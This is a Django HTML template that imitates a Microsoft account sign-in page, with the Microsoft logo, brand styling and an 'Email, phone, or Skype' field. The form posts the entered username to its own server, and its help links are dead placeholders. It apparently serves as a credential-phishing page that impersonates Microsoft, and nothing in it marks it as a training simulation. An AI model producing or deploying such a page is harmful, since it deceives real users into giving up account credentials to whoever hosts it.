{% load static %}
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in</title>

    <link href="https://fonts.cdnfonts.com/css/segoe-ui-4" rel="stylesheet">

    <style>
        body {
            margin: 0;
            font-family: "Segoe UI", sans-serif;
            background: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .background {
            background-image: url("https://wallpaperaccess.com/full/3124510.jpg");
            background-size: cover;
            background-position: center;
            filter: brightness(0.7);
            position: fixed;
            width: 100%;
            height: 100%;
            z-index: -1;
        }

        /* Main white box */
        .panel {
            background: #fff;
            width: 400px;
            padding: 40px 45px;
            box-shadow: 0 0 18px rgba(0, 0, 0, 0.2);
        }

        /* Logo + text */
        .header {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 25px;
        }

        .ms-logo {
            height: 26px;
        }

        .brand {
            font-size: 22px;
            font-weight: 600;
            color: #222;
        }

        /* Title */
        h1 {
            font-size: 26px;
            margin: 0 0 25px 0;
        }

        /* Input */
        input {
            width: 100%;
            border: none;
            border-bottom: 1px solid #888;
            padding: 10px 0;
            margin-bottom: 30px;
            font-size: 16px;
            outline: none;
        }

        /* Button */
        .next-btn {
            width: 100%;
            padding: 12px 0;
            background-color: #0067b8;
            color: #fff;
            border: none;
            font-size: 16px;
            cursor: pointer;
        }

        .next-btn:hover {
            background-color: #005fa6;
        }

        /* Links */
        .links {
            margin-top: 25px;
        }

        .links a {
            color: #0067b8;
            text-decoration: none;
            font-size: 14px;
        }

        .links p {
            margin: 6px 0;
        }
    </style>
</head>

<body>

    <div class="background"></div>

    <div class="panel">

        <div class="header">
            <img class="ms-logo" src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg">
            <span class="brand">Microsoft</span>
        </div>

        <h1>Sign in</h1>

        <form method="POST">
            {% csrf_token %}
            <input type="text" name="username" placeholder="Email, phone, or Skype" required>

            <button type="submit" class="next-btn">Next</button>
        </form>

        <div class="links">
            <p>No account? <a href="#">Create one!</a></p>
            <p><a href="#">Can't access your account?</a></p>
            <p><a href="#">Sign-in options</a></p>
        </div>

    </div>

</body>

</html>
